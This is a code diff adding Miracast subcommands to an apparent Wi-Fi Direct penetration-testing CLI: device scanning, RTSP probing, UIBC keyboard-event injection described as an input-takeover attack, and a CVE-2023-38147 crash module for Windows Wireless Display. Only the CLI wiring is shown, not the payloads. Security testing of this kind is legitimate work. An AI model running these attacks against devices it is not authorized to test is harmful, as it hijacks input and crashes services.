@@ -31,6 +31,10 @@ Subcommands:
   cve-2019-17666 rtlwifi P2P Notice of Absence kernel heap overflow
   cve-2021-0326 wpa_supplicant P2P peer info buffer overflow via PD-Req
   cve-2021-27803 wpa_supplicant p2p_pd.c Provision Discovery UAF/DoS
+  cve-2023-38147 Windows Miracast Wireless Display RTSP heap overflow
+  miracast-scan Scan only Miracast devices with full WFD IE decode
+  miracast-probe RTSP M1-M3 active probe against a sink IP (post-join)
+  miracast-uibc UIBC HID event injection against a Miracast source
 """
 from __future__ import annotations
 
@@ -67,6 +71,10 @@ from wifidirect_pentest.attacks.cve_2014_0997 import CVE_2014_0997  # noqa: E402
 from wifidirect_pentest.attacks.cve_2019_17666 import CVE_2019_17666  # noqa: E402
 from wifidirect_pentest.attacks.cve_2021_0326 import CVE_2021_0326  # noqa: E402
 from wifidirect_pentest.attacks.cve_2021_27803 import CVE_2021_27803  # noqa: E402
+from wifidirect_pentest.attacks.cve_2023_38147 import CVE_2023_38147  # noqa: E402
+from wifidirect_pentest.attacks.miracast_probe import MiracastProbe  # noqa: E402
+from wifidirect_pentest.attacks.miracast_uibc import MiracastUIBCInjector  # noqa: E402
+from wifidirect_pentest.scanners.miracast import filter_miracast, is_miracast  # noqa: E402
 from wifidirect_pentest.fuzzers import MiracastFuzzer, MiracastSink, P2PFrameFuzzer  # noqa: E402
 from wifidirect_pentest.reporting import (NoveltyGate, print_human_summary,  # noqa: E402
                                           write_run)
@@ -768,6 +776,130 @@ def cmd_cve(args) -> int:
     return 0 if r.get("confirmed") else 1
 
 
+def cmd_miracast_scan(args) -> int:
+    _require_root()
+    if args.active and not args.authorized:
+        raise SystemExit("--active requires --authorized")
+    from wifidirect_pentest.core.channels import (SOCIAL_CHANNELS,
+                                                  FULL_HOP_2GHZ, FULL_HOP_5GHZ)
+    channels = (FULL_HOP_2GHZ + FULL_HOP_5GHZ) if args.all_bands else SOCIAL_CHANNELS
+    ifc, mon = _open_monitor(args.iface)
+    try:
+        disc = Discovery(mon, channels=channels, dwell_ms=500)
+        if args.active:
+            from wifidirect_pentest.scanners.p2p_search import P2PSearchProber
+            import threading
+            prober = P2PSearchProber(mon)
+            stop = threading.Event()
+            known: set[str] = set()
+            def _loop():
+                while not stop.is_set():
+                    prober.probe_broadcast()
+                    for b in list(known):
+                        prober.probe_directed(b)
+                    time.sleep(1.0)
+            disc.on_new = lambda d: known.update(d.bssids)
+            t = threading.Thread(target=_loop, daemon=True)
+            t.start()
+            try:
+                devices = disc.run(duration=args.duration)
+            finally:
+                stop.set(); t.join(timeout=2.0)
+        else:
+            devices = disc.run(duration=args.duration)
+    finally:
+        ifc.restore()
+
+    miracasts = filter_miracast(devices.values())
+    print(f"\nMiracast devices: {len(miracasts)}\n")
+    if not miracasts:
+        print(f"RF stats: {disc.total_frames} frames, "
+              f"{disc.beacons_total} beacons, "
+              f"{disc.beacons_non_p2p} non-P2P beacons")
+        return 1
+
+    rows = []
+    for m in sorted(miracasts, key=lambda x: x.rssi_best or -999, reverse=True):
+        rows.append([
+            m.device_addr, m.role, m.device_name or "(hidden)",
+            str(m.session_mgmt_port),
+            f"{m.max_throughput_mbps}Mbps",
+            "yes" if m.content_protection else "no",
+            f"{m.rssi_best}dBm" if m.rssi_best is not None else "-",
+            ",".join(str(c) for c in m.channels_seen),
+            (m.manufacturer or "")[:14],
+            (m.model_name or "")[:14],
+        ])
+    _print_table(rows, ["DEVICE", "ROLE", "NAME", "RTSP",
+                        "MAXBW", "HDCP", "dBm", "CH", "MFR", "MODEL"])
+
+    print("\nDetail per device:")
+    for m in miracasts:
+        print(f"\n=== {m.device_addr} ===")
+        print(f"  role              : {m.role}")
+        print(f"  session mgmt port : {m.session_mgmt_port}")
+        print(f"  max throughput    : {m.max_throughput_mbps} Mbps")
+        print(f"  availability      : {m.availability}")
+        print(f"  content protection: {m.content_protection}")
+        print(f"  associated BSSID  : {m.associated_bssid or '-'}")
+        print(f"  coupled sink MAC  : {m.coupled_sink_mac or '-'}")
+        print(f"  local IP          : {m.local_ip or '-'}")
+        print(f"  WFD flags         : {m.wfd_raw_flags or '-'}")
+        print(f"  primary dev type  : {m.primary_device_type or '-'}")
+    return 0
+
+
+def cmd_miracast_probe(args) -> int:
+    if not args.authorized:
+        raise SystemExit("--authorized required (sends RTSP M1 + M3 to sink)")
+    probe = MiracastProbe(args.sink, port=args.port)
+    r = probe.run()
+    out = {
+        "sink": f"{args.sink}:{args.port}",
+        "reachable": r.reachable,
+        "sink_options": r.sink_options,
+        "sink_user_agent": r.sink_user_agent,
+        "wfd_params": r.wfd_params,
+        "transcript": r.raw_transcript,
+        "reason": r.reason,
+    }
+    print(json.dumps(out, indent=2))
+    return 0 if r.reachable else 1
+
+
+def cmd_miracast_uibc(args) -> int:
+    if not args.authorized:
+        raise SystemExit(
+            "--authorized required. UIBC injection sends HID events to the "
+            "source; this is an input-takeover attack and must only run "
+            "against a target you own.")
+    inj = MiracastUIBCInjector(args.source, args.uibc_port)
+    r = inj.send_text(args.text)
+    inj.close()
+    print(json.dumps({
+        "source": f"{args.source}:{args.uibc_port}",
+        "connected": r.connected,
+        "packets_sent": r.packets_sent,
+        "text_length": len(args.text),
+        "reason": r.reason,
+    }, indent=2))
+    return 0 if r.connected else 1
+
+
+def cmd_cve_2023_38147(args) -> int:
+    if not args.authorized:
+        raise SystemExit(
+            "--authorized required. Sends a malformed RTSP SET_PARAMETER "
+            "that is designed to crash the target's Wireless Display service.")
+    mod = CVE_2023_38147(args.sink, port=args.port,
+                         field_count=args.field_count,
+                         bursts=args.bursts,
+                         evidence_dir=args.evidence_dir)
+    r = mod.run()
+    print(json.dumps(r, indent=2))
+    return 0 if r.get("confirmed") else 1
+
+
 def cmd_novelty_check(args) -> int:
     findings = load_findings(args.input)
     findings = NoveltyGate().apply(findings)
@@ -1081,6 +1213,42 @@ def build_parser() -> argparse.ArgumentParser:
         c.add_argument("--authorized", action="store_true")
         c.set_defaults(func=cmd_cve, cve=cve_id, doc=doc)
 
+    # Miracast subcommands (RTSP + UIBC + CVE-2023-38147)
+    ms_scan = _add("miracast-scan")
+    ms_scan.add_argument("-i", "--iface", required=True)
+    ms_scan.add_argument("--duration", type=float, default=60.0)
+    ms_scan.add_argument("--all-bands", action="store_true")
+    ms_scan.add_argument("--active", action="store_true",
+                         help="also send P2P Search Probes to elicit WFD IE")
+    ms_scan.add_argument("--authorized", action="store_true")
+    ms_scan.set_defaults(func=cmd_miracast_scan)
+
+    ms_probe = _add("miracast-probe")
+    ms_probe.add_argument("--sink", required=True,
+                          help="Miracast sink IP address (post-join)")
+    ms_probe.add_argument("--port", type=int, default=7236)
+    ms_probe.add_argument("--authorized", action="store_true")
+    ms_probe.set_defaults(func=cmd_miracast_probe)
+
+    ms_uibc = _add("miracast-uibc")
+    ms_uibc.add_argument("--source", required=True,
+                         help="Miracast source IP exposing UIBC listener")
+    ms_uibc.add_argument("--uibc-port", type=int, required=True,
+                         help="UIBC TCP port from the source's M4 wfd_uibc_capability")
+    ms_uibc.add_argument("--text", required=True,
+                         help="ASCII string to inject as keyboard events")
+    ms_uibc.add_argument("--authorized", action="store_true")
+    ms_uibc.set_defaults(func=cmd_miracast_uibc)
+
+    cve_mc = _add("cve-2023-38147")
+    cve_mc.add_argument("--sink", required=True,
+                        help="Windows Miracast sink IP")
+    cve_mc.add_argument("--port", type=int, default=7236)
+    cve_mc.add_argument("--field-count", type=int, default=500)
+    cve_mc.add_argument("--bursts", type=int, default=3)
+    cve_mc.add_argument("--authorized", action="store_true")
+    cve_mc.set_defaults(func=cmd_cve_2023_38147)
+
     return p
 
 
@@ -1094,6 +1262,7 @@ def main() -> int:
         "driver-probe", "karma", "p2p-fuzz",
         "cve-2014-0997", "cve-2019-17666",
         "cve-2021-0326", "cve-2021-27803",
+        "miracast-scan",
     }
     wants_pick = ("--pick-adapter" in sys.argv)
     asking_help = any(a in ("-h", "--help") for a in sys.argv)
